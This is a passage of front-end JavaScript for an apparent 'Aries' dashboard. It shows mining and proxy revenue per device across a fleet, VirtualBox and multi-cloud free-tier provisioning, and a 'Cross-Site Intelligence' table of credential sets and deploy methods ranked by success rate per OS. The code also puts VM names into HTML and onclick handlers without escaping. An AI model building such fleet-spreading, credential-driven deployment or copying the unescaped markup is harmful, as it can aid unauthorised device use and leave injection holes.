        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--green, #0f0)">&#x1F4B0; Combined Revenue Estimate</h3>';
        var pd = (netEarn && netEarn.perDevice) || { mining: 0.01, selfProxy: 0.50, thirdParty: 0, total: 0.51 };
        var fl = (netEarn && netEarn.fleet) || { devices: 0, dailyEstimate: 0, monthlyEstimate: 0 };
        html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:16px">';
        html += '<div style="background:var(--bg2, #111);padding:14px;border-radius:8px;text-align:center"><div style="color:var(--dim);font-size:11px">Per Device/Day</div><div style="font-size:22px;font-weight:bold;color:var(--green, #0f0)">$' + pd.total.toFixed(2) + '</div></div>';
        html += '<div style="background:var(--bg2, #111);padding:14px;border-radius:8px;text-align:center"><div style="color:var(--dim);font-size:11px">Fleet Daily (' + fl.devices + ' devices)</div><div style="font-size:22px;font-weight:bold;color:var(--green, #0f0)">$' + fl.dailyEstimate.toFixed(2) + '</div></div>';
        html += '<div style="background:var(--bg2, #111);padding:14px;border-radius:8px;text-align:center"><div style="color:var(--dim);font-size:11px">Fleet Monthly</div><div style="font-size:22px;font-weight:bold;color:var(--green, #0f0)">$' + fl.monthlyEstimate.toFixed(2) + '</div></div>';
        html += '</div>';

        html += '<div style="font-size:12px;color:var(--dim)">';
        html += '<div style="margin-bottom:4px">&#x26CF; Mining: <strong>$' + pd.mining.toFixed(2) + '</strong>/device/day</div>';
        html += '<div style="margin-bottom:4px">&#x1F310; Self-Hosted Proxy: <strong>$' + pd.selfProxy.toFixed(2) + '</strong>/device/day</div>';
        html += '<div style="margin-bottom:4px">&#x1F517; Third-Party Networks: <strong>$' + pd.thirdParty.toFixed(2) + '</strong>/device/day</div>';
        html += '<div style="margin-top:8px;padding-top:8px;border-top:1px solid var(--border, #333);color:var(--accent)">At 50K devices: <strong>$' + (pd.total * 50000).toFixed(0) + '/day</strong> = <strong>$' + (pd.total * 50000 * 30).toFixed(0) + '/month</strong></div>';
        html += '</div></div>';

        document.getElementById('proxyNetContent').innerHTML = html;
      }).catch(function(e) {
        document.getElementById('proxyNetContent').innerHTML = '<div class="card" style="color:var(--red, #f44)">Error loading proxy network: ' + escapeHtml(e.message) + '</div>';
      });
    }

    // ═══════════════════════════════════════════════════════════
    // Cloud Auto-Provisioner
    // ═══════════════════════════════════════════════════════════
    // ═══════════════════════════════
    //  VIRTUALBOX PROVISIONER
    // ═══════════════════════════════
    function loadVbox() {
      api('GET', 'vbox/status').then(function(d) {
        // Availability
        var availEl = document.getElementById('vboxAvail');
        if (availEl) {
          availEl.textContent = d.available ? '✅ Installed' : '❌ Not Found';
          availEl.style.color = d.available ? '#0f0' : '#f55';
        }
        // Template
        var tplEl = document.getElementById('vboxTemplate');
        if (tplEl) {
          var tplMap = { ready: '✅ Ready', building: '🔨 Building...', not_found: '❌ Not Found', no_snapshot: '⚠️ No Snapshot', vbox_not_found: '-', needs_install: '⚠️ Needs Install' };
          tplEl.textContent = tplMap[d.templateStatus] || d.templateStatus;
          tplEl.style.color = d.templateStatus === 'ready' ? '#0f0' : d.templateStatus === 'building' ? '#ff0' : '#f55';
        }
        // Resources
        var res = d.resources || {};
        var runEl = document.getElementById('vboxRunning');
        if (runEl) runEl.textContent = res.runningVms || 0;
        var maxEl = document.getElementById('vboxMaxNew');
        if (maxEl) maxEl.textContent = res.maxNewVms || 0;

        var ramPct = res.totalRamMb ? Math.round(((res.totalRamMb - res.freeRamMb) / res.totalRamMb) * 100) : 0;
        var ramBar = document.getElementById('vboxRamBar');
        if (ramBar) ramBar.style.width = ramPct + '%';
        var ramText = document.getElementById('vboxRamText');
        if (ramText) ramText.textContent = (res.totalRamMb - res.freeRamMb) + 'MB / ' + res.totalRamMb + 'MB (' + res.allocatedRamMb + 'MB to VMs)';

        var cpuPct = res.cpuCount ? Math.round((res.allocatedCpus / res.cpuCount) * 100) : 0;
        var cpuBar = document.getElementById('vboxCpuBar');
        if (cpuBar) cpuBar.style.width = cpuPct + '%';
        var cpuText = document.getElementById('vboxCpuText');
        if (cpuText) cpuText.textContent = res.allocatedCpus + ' / ' + res.cpuCount + ' allocated to VMs';

        // VM List
        var listEl = document.getElementById('vboxVmList');
        if (!listEl) return;
        var vms = d.vms || [];
        if (vms.length === 0) {
          listEl.innerHTML = '<div style="padding:16px;text-align:center;color:var(--text-dim)">No VMs created yet. Build a template first, then create workers.</div>';
          return;
        }
        var html = '';
        for (var i = 0; i < vms.length; i++) {
          var vm = vms[i];
          var stateColor = vm.state === 'running' ? '#0f0' : vm.state === 'stopped' ? '#888' : vm.state === 'creating' ? '#ff0' : '#f55';
          var stateIcon = vm.state === 'running' ? '🟢' : vm.state === 'stopped' ? '⚫' : vm.state === 'creating' ? '🟡' : '🔴';
          html += '<div style="display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px">';
          html += '<span style="font-size:18px">' + stateIcon + '</span>';
          html += '<div style="flex:1">';
          html += '<div style="font-weight:600;color:var(--text)">' + vm.name + '</div>';
          html += '<div style="font-size:12px;color:var(--text-dim)">' + vm.ramMb + 'MB RAM · ' + vm.cpus + ' CPU · SSH :' + vm.sshPort;
          if (vm.swarmEnrolled) html += ' · <span style="color:#0f0">Enrolled</span>';
          html += '</div>';
          html += '</div>';
          html += '<span style="color:' + stateColor + ';font-size:12px;font-weight:600;text-transform:uppercase">' + vm.state + '</span>';
          html += '<div style="display:flex;gap:4px">';
          if (vm.state === 'stopped') html += '<button class="btn-sm" onclick="window.aries.vboxStart(\'' + vm.name + '\')">▶ Start</button>';
          if (vm.state === 'running') html += '<button class="btn-sm" onclick="window.aries.vboxStop(\'' + vm.name + '\')">⏹ Stop</button>';
          html += '<button class="btn-sm" style="color:#f55" onclick="window.aries.vboxDelete(\'' + vm.name + '\')">🗑</button>';
          html += '</div></div>';
        }
        listEl.innerHTML = html;
      }).catch(function(e) {
        var availEl = document.getElementById('vboxAvail');
        if (availEl) { availEl.textContent = '❌ Error: ' + e.message; availEl.style.color = '#f55'; }
      });
    }

    function vboxCreateWorkers() {
      var countEl = document.getElementById('vboxCount');
      var count = countEl ? parseInt(countEl.value) || 3 : 3;
      toast('Creating ' + count + ' worker VMs...', 'info');
      api('POST', 'vbox/create', { count: count }).then(function(d) {
        toast('Created ' + d.created + ' VMs (' + d.skipped + ' skipped)', 'success');
        loadVbox();
      }).catch(function(e) { toast('Create failed: ' + e.message, 'error'); });
    }

    function vboxCreateTemplate() {
      toast('Building template... this may take a while', 'info');
      api('POST', 'vbox/create-template').then(function(d) {
        toast('Template build started', 'success');
        // Poll build log
        var logEl = document.getElementById('vboxBuildLog');
        if (logEl) logEl.style.display = 'block';
        var poll = setInterval(function() {
          api('GET', 'vbox/build-log').then(function(d) {
            if (logEl) logEl.textContent = d.log.join('\n');
            logEl.scrollTop = logEl.scrollHeight;
            if (!d.building) { clearInterval(poll); loadVbox(); }
          }).catch(function() { clearInterval(poll); });
        }, 3000);
      }).catch(function(e) { toast('Template build failed: ' + e.message, 'error'); });
    }

    function vboxTakeSnapshot() {
      api('POST', 'vbox/take-snapshot').then(function() {
        toast('Snapshot taken', 'success');
        loadVbox();
      }).catch(function(e) { toast('Snapshot failed: ' + e.message, 'error'); });
    }

    function vboxStart(name) {
      api('POST', 'vbox/start', { name: name }).then(function() {
        toast(name + ' starting...', 'success');
        setTimeout(loadVbox, 2000);
      }).catch(function(e) { toast('Start failed: ' + e.message, 'error'); });
    }

    function vboxStop(name) {
      api('POST', 'vbox/stop', { name: name }).then(function() {
        toast(name + ' stopping...', 'info');
        setTimeout(loadVbox, 3000);
      }).catch(function(e) { toast('Stop failed: ' + e.message, 'error'); });
    }

    function vboxDelete(name) {
      if (!confirm('Delete VM ' + name + '? This cannot be undone.')) return;
      api('POST', 'vbox/delete', { name: name }).then(function() {
        toast(name + ' deleted', 'success');
        loadVbox();
      }).catch(function(e) { toast('Delete failed: ' + e.message, 'error'); });
    }

    function loadCloudAuto() {
      var el = document.getElementById('cloudAutoContent');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading...';

      Promise.all([
        api('GET', 'cloud-auto/status').catch(function() { return {}; }),
        api('GET', 'cloud-auto/log').catch(function() { return { log: [] }; }),
        api('GET', 'cloud-auto/cost').catch(function() { return {}; }),
        api('GET', 'cloud-auto/credentials').catch(function() { return { providers: [] }; })
      ]).then(function(results) {
        var st = results[0], logData = results[1].log || [], cost = results[2], creds = results[3].providers || [];
        var html = '';

        // Cost guard
        html += '<div class="card" style="margin-bottom:16px;text-align:center;padding:20px;border:2px solid var(--green, #0f0)">';
        html += '<div style="font-size:36px;font-weight:bold;color:var(--green, #0f0)">$' + ((cost.totalMonthly || 0).toFixed(2)) + '</div>';
        html += '<div style="color:var(--green, #0f0);font-size:14px">\u2705 Free Tier Only \u2014 Cost Guard Active</div>';
        html += '</div>';

        // Auto-scaling toggle
        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent)">Auto-Scaling</h3>';
        html += '<div style="display:flex;align-items:center;gap:12px">';
        html += '<span style="display:inline-block;width:12px;height:12px;border-radius:50%;background:' + (st.autoScaling ? '#0f0' : '#f55') + '"></span>';
        html += '<strong>' + (st.autoScaling ? 'Running' : 'Stopped') + '</strong>';
        if (st.autoScaling) {
          html += '<button class="btn-primary" onclick="api(\'POST\',\'cloud-auto/stop\').then(function(){toast(\'Stopped\',\'success\');window.aries.loadCloudAuto()})" style="background:var(--red, #f44)">\u23F9 Stop</button>';
        } else {
          html += '<button class="btn-primary" onclick="api(\'POST\',\'cloud-auto/start\').then(function(){toast(\'Started\',\'success\');window.aries.loadCloudAuto()})">\u25B6 Start Auto-Scaling</button>';
        }
        html += '<button class="btn-sm" onclick="api(\'POST\',\'cloud-auto/check\').then(function(d){toast(\'Check complete\',\'success\');window.aries.loadCloudAuto()})">\uD83D\uDD0D Manual Check</button>';
        html += '</div>';
        if (st.lastCheck) html += '<div style="color:var(--dim);font-size:11px;margin-top:8px">Last check: ' + new Date(st.lastCheck).toLocaleString() + (st.nextCheck ? ' | Next: ' + new Date(st.nextCheck).toLocaleString() : '') + '</div>';
        html += '</div>';

        // Totals
        html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px">';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (st.totalVMs || 0) + '/' + (st.maxPossibleVMs || 9) + '</div><div style="color:var(--dim);font-size:12px">Free VMs</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (st.totalCores || 0) + '</div><div style="color:var(--dim);font-size:12px">Total Cores</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (st.totalRAM || 0) + ' GB</div><div style="color:var(--dim);font-size:12px">Total RAM</div></div>';
        html += '</div>';

        // Provider cards
        html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;margin-bottom:16px">';
        var providers = st.providers || {};
        var providerKeys = ['oracle', 'aws', 'azure', 'gcp'];
        var providerEmoji = { oracle: '\uD83D\uDD36', aws: '\uD83D\uDFE7', azure: '\uD83D\uDD35', gcp: '\uD83D\uDFE2' };
        for (var pi = 0; pi < providerKeys.length; pi++) {
          var pk = providerKeys[pi];
          var p = providers[pk] || {};
          var borderColor = p.configured ? 'var(--green, #0f0)' : 'var(--border, #333)';
          html += '<div style="background:var(--bg2, #111);border:1px solid ' + borderColor + ';border-radius:10px;padding:16px">';
          html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">';
          html += '<div style="font-size:16px;font-weight:bold">' + (providerEmoji[pk] || '') + ' ' + (p.name || pk) + '</div>';
          html += '<span style="font-size:11px;padding:2px 8px;border-radius:10px;background:' + (p.configured ? 'rgba(0,255,0,0.15);color:#0f0' : 'rgba(255,255,255,0.05);color:var(--dim)') + '">' + (p.configured ? '\u2713 Configured' : '\u2717 Not configured') + '</span>';
          html += '</div>';
          html += '<div style="font-size:20px;font-weight:bold;color:var(--accent);margin-bottom:4px">' + (p.instances || 0) + ' / ' + (p.maxFree || 0) + '</div>';
          html += '<div style="color:var(--dim);font-size:12px;margin-bottom:8px">' + (p.freeForever ? 'Free Forever' : 'Free 12 months') + ' \u2022 Max ' + (p.totalMaxCores || 0) + ' cores, ' + (p.totalMaxRAM || 0) + 'GB RAM</div>';
          if (!p.configured) {
            html += '<button class="btn-sm" onclick="window.aries.cloudAutoAddCreds(\'' + pk + '\')">+ Add Credentials</button>';
          }
          html += '</div>';
        }
        html += '</div>';

        // Provision log
        if (logData.length) {
          html += '<div class="card"><h3 style="margin:0 0 12px;color:var(--accent)">Provisioning Log</h3>';
          html += '<table class="data-table"><tr><th>Time</th><th>Action</th><th>Provider</th><th>Details</th></tr>';
          for (var li = 0; li < Math.min(logData.length, 50); li++) {
            var l = logData[li];
            html += '<tr><td style="font-size:11px">' + (l.timestamp ? new Date(l.timestamp).toLocaleString() : '-') + '</td>';
            html += '<td>' + escapeHtml(l.action || '') + '</td>';
            html += '<td>' + escapeHtml(l.provider || '-') + '</td>';
            html += '<td style="font-size:11px;color:var(--dim)">' + escapeHtml(l.error || l.displayName || l.message || '') + '</td></tr>';
          }
          html += '</table></div>';
        }

        document.getElementById('cloudAutoContent').innerHTML = html;
      });
    }

    function cloudAutoAddCreds(provider) {
      var fields = { oracle: ['tenancy_ocid', 'user_ocid', 'fingerprint', 'region'], aws: ['access_key_id', 'secret_access_key', 'region'], azure: ['subscription_id', 'tenant_id', 'client_id', 'client_secret'], gcp: ['project_id'] };
      var pFields = fields[provider] || [];
      var creds = { provider: provider };
      for (var i = 0; i < pFields.length; i++) {
        var val = prompt(provider.toUpperCase() + ' \u2014 ' + pFields[i] + ':');
        if (val === null) return;
        creds[pFields[i]] = val;
      }
      api('POST', 'cloud-auto/credentials', creds).then(function() { toast('Credentials saved', 'success'); window.aries.loadCloudAuto(); }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════════════════════════════════
    // Cross-Site Intelligence
    // ═══════════════════════════════════════════════════════════
    function loadCrossSite() {
      var el = document.getElementById('panelContent');
      if (!el) return;
      el.innerHTML = '<div class="panel-header"><h2>\uD83C\uDF10 Cross-Site Intelligence</h2><button class="btn-sm" onclick="window.aries.loadCrossSite()">\uD83D\uDD04 Refresh</button></div><div id="crossSiteContent"><div class="spinner"></div> Loading...</div>';

      Promise.all([
        api('GET', 'cross-site/stats').catch(function() { return {}; }),
        api('GET', 'cross-site/methods').catch(function() { return { methods: [] }; })
      ]).then(function(results) {
        var stats = results[0], methods = results[1].methods || [];
        var html = '';

        // Stats cards
        html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px">';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (stats.totalSites || 0) + '</div><div style="color:var(--dim);font-size:12px">Sites</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (stats.totalDevices || 0) + '</div><div style="color:var(--dim);font-size:12px">Total Devices</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--green, #0f0)">' + (stats.globalSuccessRate || 0) + '%</div><div style="color:var(--dim);font-size:12px">Global Success Rate</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (stats.credentialSets || 0) + '</div><div style="color:var(--dim);font-size:12px">Credential Sets</div></div>';
        html += '<div class="card" style="text-align:center;padding:16px"><div style="font-size:24px;font-weight:bold;color:var(--accent)">' + (stats.hardwareProfiles || 0) + '</div><div style="color:var(--dim);font-size:12px">Hardware Profiles</div></div>';
        html += '</div>';

        // Sync button
        html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent)">Sync</h3>';
        html += '<div style="display:flex;gap:8px;align-items:center">';
        html += '<button class="btn-primary" onclick="api(\'POST\',\'cross-site/sync\').then(function(){toast(\'Sync complete\',\'success\');window.aries.loadCrossSite()})">\uD83D\uDD04 Sync with Relay</button>';
        if (stats.lastSync) html += '<span style="color:var(--dim);font-size:11px">Last sync: ' + new Date(stats.lastSync).toLocaleString() + '</span>';
        html += '</div></div>';

        // Top methods
        if (methods.length) {
          html += '<div class="card" style="margin-bottom:16px"><h3 style="margin:0 0 12px;color:var(--accent)">Best Deploy Methods</h3>';
          html += '<table class="data-table"><tr><th>Method</th><th>OS Pattern</th><th>Success Rate</th><th>Uses</th><th>Confidence</th></tr>';
          for (var mi = 0; mi < Math.min(methods.length, 20); mi++) {
            var m = methods[mi];
            html += '<tr><td style="color:var(--accent)">' + escapeHtml(m.method || '') + '</td>';
            html += '<td>' + escapeHtml(m.osPattern || '*') + '</td>';
            html += '<td style="color:' + (m.successRate > 70 ? '#0f0' : m.successRate > 40 ? '#ff6' : '#f55') + '">' + m.successRate + '%</td>';
            html += '<td>' + (m.total || 0) + '</td>';
            html += '<td>' + (m.confidence || 0) + '%</td></tr>';
          }
          html += '</table></div>';
        }

        // Top errors
        if (stats.topErrors && stats.topErrors.length) {
          html += '<div class="card"><h3 style="margin:0 0 12px;color:var(--red, #f44)">Common Errors</h3>';
          html += '<table class="data-table"><tr><th>Error</th><th>Count</th></tr>';
          for (var ei = 0; ei < stats.topErrors.length; ei++) {
            var e = stats.topErrors[ei];
            html += '<tr><td style="color:var(--dim);font-size:12px">' + escapeHtml(e.error || '') + '</td><td>' + e.count + '</td></tr>';
          }
          html += '</table></div>';
        }

        document.getElementById('crossSiteContent').innerHTML = html;
      });
    }


    // ── SWARM WORKER DASHBOARD ──
    var _workerRefreshTimer = null;

    function joinSwarmWorker() {
      var btn = document.getElementById('joinSwarmBtn');
      if (btn) btn.disabled = true;
      var prog = document.getElementById('joinProgress');
      if (prog) prog.style.display = 'block';
      setText('joinStatus', 'Setting up...');
      document.getElementById('joinBar').style.width = '20%';

      api('POST', 'swarm/join').then(function(d) {
        document.getElementById('joinBar').style.width = '100%';
        if (d.ok) {
          setText('joinStatus', "You're in! Worker ID: " + (d.workerId || ''));
          toast('Joined the Aries Network!', 'success');
          _ariesNetworkJoined = true;
          var nav = document.getElementById('navAriesAi');
          if (nav) nav.style.display = '';
          initModelSelector(); // Refresh to show Aries AI option
          setTimeout(refreshWorkerDashboard, 500);
        } else {
          setText('joinStatus', 'Failed: ' + (d.error || 'unknown'));
          if (btn) btn.disabled = false;
        }
      }).catch(function(e) {
        setText('joinStatus', 'Error: ' + e.message);
        if (btn) btn.disabled = false;
      });
    }

    function leaveSwarmWorker() {
      if (!confirm('Leave the swarm? This will stop all worker tasks and mining.')) return;
      api('POST', 'swarm/leave').then(function() {
        toast('Left the swarm', 'info');
        refreshWorkerDashboard();
      }).catch(function() { toast('Failed to leave', 'error'); });
    }

    function minerControl(action) {
      api('POST', 'swarm/mining/' + action).then(function(d) {
        toast('Miner ' + action + (d.ok ? ' OK' : ' failed'), d.ok ? 'success' : 'error');
        refreshWorkerDashboard();
      }).catch(function() { toast('Failed', 'error'); });
    }

    function workerControl(action) {
      api('POST', 'swarm/worker/' + action).then(function(d) {
        toast('Worker ' + action + (d.ok ? ' OK' : ' failed'), d.ok ? 'success' : 'error');
        refreshWorkerDashboard();
      }).catch(function() { toast('Failed', 'error'); });
    }

    function refreshWorkerDashboard() {
      api('GET', 'swarm/worker/status').then(function(d) {
        var notJoined = document.getElementById('workerNotJoined');
        var joined = document.getElementById('workerJoined');
        if (!notJoined || !joined) return;

        if (d.enrolled) {
          notJoined.style.display = 'none';
          joined.style.display = 'block';
          setText('wkrWorkerId', d.workerId || '-');
          setText('wkrConnStatus', d.connected ? '🟢 Online' : '🔴 Offline');

          var up = d.uptime || 0;
          var h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60);
          setText('wkrUptime', (h > 0 ? h + 'h ' : '') + m + 'm');

          var w = d.worker || {};
          setText('wkrTasks', String(w.tasksCompleted || d.tasksCompleted || 0));
          setText('wkrTokens', String(w.tokensProcessed || 0));

          var mi = d.mining || {};
          setText('wkrHashrate', mi.running ? (mi.hashrate || 0).toFixed(1) + ' H/s' : '-');
        } else {
          notJoined.style.display = 'block';
          joined.style.display = 'none';
        }
      }).catch(function() {});
    }

    // Auto-refresh worker dashboard when swarm panel is visible
    var _workerPanelHooked = false;
    function hookSwarmPanelRefresh() {
      // Refresh on panel switch - will be called from switchPanel
      if (currentPanel === 'swarm') {
        refreshWorkerDashboard();
        if (!_workerRefreshTimer) _workerRefreshTimer = setInterval(refreshWorkerDashboard, 15000);
      } else {
        if (_workerRefreshTimer) { clearInterval(_workerRefreshTimer); _workerRefreshTimer = null; }
      }
    }

    // ── ARES Evolution Panel ──
    var _aresRefreshTimer = null;
    function loadAres() {
      var el = document.getElementById('aresContent');
      if (!el) return;
      el.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-dim)">Loading ARES data...</div>';
      Promise.all([
        api('GET', 'ares/status').catch(function() { return {}; }),
        api('GET', 'ares/model').catch(function() { return {}; }),
        api('GET', 'ares/growth').catch(function() { return { history: {}, projection: {} }; }),
        api('GET', 'ares/data').catch(function() { return {}; }),
        api('GET', 'ares/swarm/training').catch(function() { return {}; }),
        api('GET', 'ares/leaderboard').catch(function() { return []; }),
        api('GET', 'ares/credits').catch(function() { return { breakdown: {} }; }),
      ]).then(function(results) {
        var status = results[0], model = results[1], growthData = results[2];
        var data = results[3], swarm = results[4], leaderboard = results[5], tierData = results[6];
        var history = growthData.history || {};
        var projection = growthData.projection || {};

        var statusColor = status.status === 'idle' ? '#22c55e' : status.status === 'error' ? '#ef4444' : '#f59e0b';
        var statusIcon = status.status === 'idle' ? '●' : status.status === 'error' ? '✗' : '◌';

        var html = '<div class="grid-2">';

        // Main Status Card
        html += '<div class="card">';
        html += '<h3 style="color:var(--accent)">🧠 Model Status</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0">';
        html += '<div class="stat-block"><div class="stat-value">' + (model.effective_params_human || '70B') + '</div><div class="stat-label">Effective Params</div></div>';
        html += '<div class="stat-block"><div class="stat-value">' + (model.cycle || 0) + '</div><div class="stat-label">Training Cycles</div></div>';
        html += '<div class="stat-block"><div class="stat-value">' + (model.adapter_count || 0) + '</div><div class="stat-label">Adapters Stacked</div></div>';
        html += '<div class="stat-block"><div class="stat-value" style="color:' + statusColor + '">' + statusIcon + ' ' + (status.status || 'unknown') + '</div><div class="stat-label">Status</div></div>';
        html += '</div>';
        html += '<div style="font-size:12px;color:var(--text-dim)">Base: ' + (model.base_model || 'N/A') + ' | LoRA Rank: ' + (model.lora_rank || 64) + ' | Version: ' + (model.version || 'ares-v0') + '</div>';
        html += '</div>';

        // Training Progress Card
        html += '<div class="card">';
        html += '<h3 style="color:var(--accent)">⚡ Training</h3>';
        if (status.running) {
          html += '<div class="progress-bar" style="margin:12px 0"><div class="progress-fill" style="width:' + (status.detail ? '50' : '0') + '%"></div></div>';
          html += '<div style="font-size:13px;color:var(--text-dim)">' + (status.detail || 'Running...') + '</div>';
        } else {
          html += '<div style="padding:12px 0;color:var(--text-dim)">No active training cycle</div>';
        }
        if (status.last_cycle_end) {
          html += '<div style="font-size:12px;margin-top:8px;color:var(--text-dim)">Last cycle: ' + new Date(status.last_cycle_end).toLocaleString() + '</div>';
        }
        html += '<div style="margin-top:12px;display:flex;gap:8px">';
        html += '<select id="aresSchedule" style="background:var(--bg-card);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:4px 8px;font-size:12px">';
        html += '<option value="">Manual</option><option value="daily"' + (status.schedule === 'daily' ? ' selected' : '') + '>Daily</option>';
        html += '<option value="weekly"' + (status.schedule === 'weekly' ? ' selected' : '') + '>Weekly</option>';
        html += '</select>';
        html += '<button class="btn-sm" onclick="window.aries.aresSetSchedule()">Set Schedule</button>';
        html += '</div>';
        html += '</div>';

        // Dataset Card
        html += '<div class="card">';
        html += '<h3 style="color:var(--accent)">📊 Training Data</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0">';
        html += '<div class="stat-block"><div class="stat-value">' + (data.totalExamples || 0) + '</div><div class="stat-label">Total Examples</div></div>';
        html += '<div class="stat-block"><div class="stat-value">$' + (data.costEstimate || 0).toFixed(2) + '</div><div class="stat-label">Opus Cost</div></div>';
        html += '</div>';
        var cats = data.byCategory || {};
        var catKeys = Object.keys(cats);
        if (catKeys.length > 0) {
          html += '<div style="margin-top:8px">';
          for (var ci = 0; ci < catKeys.length; ci++) {
            var pct = data.totalExamples > 0 ? Math.round((cats[catKeys[ci]] / data.totalExamples) * 100) : 0;
            html += '<div style="display:flex;justify-content:space-between;font-size:12px;margin:2px 0"><span>' + catKeys[ci] + '</span><span>' + cats[catKeys[ci]] + ' (' + pct + '%)</span></div>';
            html += '<div style="background:var(--bg-darker);border-radius:2px;height:4px;margin-bottom:4px"><div style="background:var(--accent);height:100%;border-radius:2px;width:' + pct + '%"></div></div>';
          }
          html += '</div>';
        }
        html += '<div style="margin-top:8px"><select id="aresDataCategory" style="background:var(--bg-card);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:4px 8px;font-size:12px">';
        var allCats = ['reasoning','code','creative','tool_use','long_context','problem_solving','instruction','roleplay'];
        for (var ac = 0; ac < allCats.length; ac++) html += '<option value="' + allCats[ac] + '">' + allCats[ac] + '</option>';
        html += '</select></div>';
        html += '</div>';

        // Swarm Training Card
        html += '<div class="card">';
        html += '<h3 style="color:var(--accent)">🌐 Swarm Training</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0">';
        html += '<div class="stat-block"><div class="stat-value">' + (swarm.gpuWorkers || 0) + '</div><div class="stat-label">GPU Workers</div></div>';
        html += '<div class="stat-block"><div class="stat-value">' + (swarm.totalGradients || 0) + '</div><div class="stat-label">Gradients Synced</div></div>';
        html += '</div>';
        if (swarm.workers && swarm.workers.length > 0) {
          html += '<div style="max-height:120px;overflow-y:auto;font-size:12px">';
          for (var wi = 0; wi < swarm.workers.length; wi++) {
            var w = swarm.workers[wi];
            var wColor = w.status === 'training' ? '#f59e0b' : '#22c55e';
            html += '<div style="display:flex;justify-content:space-between;padding:2px 0"><span>' + w.id.substring(0,12) + '</span><span style="color:' + wColor + '">' + w.status + '</span></div>';
          }
          html += '</div>';
        } else {
          html += '<div style="color:var(--text-dim);font-size:13px">No GPU workers connected</div>';
        }
        html += '</div>';

        // Growth Projection Card
        html += '<div class="card" style="grid-column:span 2">';
        html += '<h3 style="color:var(--accent)">📈 Growth Projection (6 months)</h3>';
        if (projection.projections && projection.projections.length > 0) {
          html += '<div style="display:flex;gap:4px;align-items:flex-end;height:80px;margin:12px 0">';
          var maxP = 0;
          for (var pi = 0; pi < projection.projections.length; pi++) {
            if (projection.projections[pi].effectiveParams > maxP) maxP = projection.projections[pi].effectiveParams;
          }
          for (var pj = 0; pj < projection.projections.length; pj++) {
            var p = projection.projections[pj];
            var barH = maxP > 0 ? Math.max(5, Math.round((p.effectiveParams / maxP) * 70)) : 5;
            html += '<div style="flex:1;display:flex;flex-direction:column;align-items:center">';
            html += '<div style="font-size:10px;color:var(--accent)">' + p.effectiveParamsHuman + '</div>';
            html += '<div style="width:100%;height:' + barH + 'px;background:linear-gradient(to top,var(--accent),var(--accent-dim));border-radius:2px"></div>';
            html += '<div style="font-size:10px;color:var(--text-dim);margin-top:4px">M' + p.month + '</div>';
            html += '</div>';
          }
          html += '</div>';
        }
        html += '<div style="font-size:12px;color:var(--text-dim)">Current: ' + (projection.currentHuman || history.currentEffectiveHuman || '70B') + '</div>';
        html += '</div>';

        // Leaderboard Card
        html += '<div class="card">';
        html += '<h3 style="color:var(--accent)">🏆 Top Contributors</h3>';
        if (Array.isArray(leaderboard) && leaderboard.length > 0) {
          html += '<div style="font-size:12px">';
          for (var li = 0; li < leaderboard.length; li++) {
            var lb = leaderboard[li];
            var medal = li === 0 ? '🥇' : li === 1 ? '🥈' : li === 2 ? '🥉' : (li + 1) + '.';
            html += '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--border)">';
            html += '<span>' + medal + ' ' + lb.workerId.substring(0,16) + '</span>';
            html += '<span style="color:var(--accent)">' + Math.round(lb.totalCredits) + ' credits · ' + lb.tier + '</span>';
            html += '</div>';
          }
          html += '</div>';
        } else {
          html += '<div style="color:var(--text-dim);padding:12px 0">No contributors yet</div>';
        }
        html += '</div>';

        // Tier Breakdown Card
        html += '<div class="card">';
        html += '<h3 style="color:var(--accent)">🎖 Tier Breakdown</h3>';
        var bd = tierData.breakdown || {};
        var tierColors = { FREE: '#6b7280', CONTRIBUTOR: '#3b82f6', TRAINER: '#f59e0b', CORE: '#ef4444' };
        var tierKeys = ['FREE', 'CONTRIBUTOR', 'TRAINER', 'CORE'];
        html += '<div style="margin:12px 0">';
        for (var ti = 0; ti < tierKeys.length; ti++) {
          var tk = tierKeys[ti];
          var cnt = bd[tk] || 0;
          html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:4px 0">';
          html += '<span style="display:flex;align-items:center;gap:6px"><span style="width:10px;height:10px;border-radius:50%;background:' + tierColors[tk] + ';display:inline-block"></span>' + tk + '</span>';
          html += '<span style="font-weight:600">' + cnt + '</span>';
          html += '</div>';
        }
        html += '</div>';
        html += '</div>';

        html += '</div>'; // grid-2
        el.innerHTML = html;
      });

